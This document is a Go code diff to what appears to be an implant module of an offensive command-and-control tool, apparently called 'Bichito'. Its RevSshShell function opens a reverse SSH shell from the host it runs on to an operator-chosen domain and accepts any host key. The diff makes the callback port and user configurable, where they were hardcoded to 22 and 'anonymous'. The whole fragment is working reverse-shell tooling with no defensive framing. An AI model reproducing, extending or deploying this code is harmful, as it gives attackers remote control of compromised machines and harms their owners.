@@ -24,6 +24,8 @@ import (
 type InjectRevSshShellBichito struct {
     Domain string   `json:"domain"`
     Sshkey string   `json:"sshkey"`
+    Port string   `json:"port"`
+    User string   `json:"user"`
 }
 
 
@@ -44,7 +46,7 @@ func RevSshShell(jsonparams string) (bool,string){
 	}
 
 	config := &ssh.ClientConfig{
-		User: "anonymous",
+		User: revsshshellparams.User,
 		Auth: nil,
 	    HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
             return nil
@@ -55,7 +57,7 @@ func RevSshShell(jsonparams string) (bool,string){
 	config.Auth = append(config.Auth, auth)
 
 	// Dial the SSH connection
-	sshConn, err := ssh.Dial("tcp", revsshshellparams.Domain+":22", config)
+	sshConn, err := ssh.Dial("tcp", revsshshellparams.Domain+":"+revsshshellparams.Port, config)
 	if err != nil {
 		return true,"Error: error dialing remote host:"+err.Error()
 	}
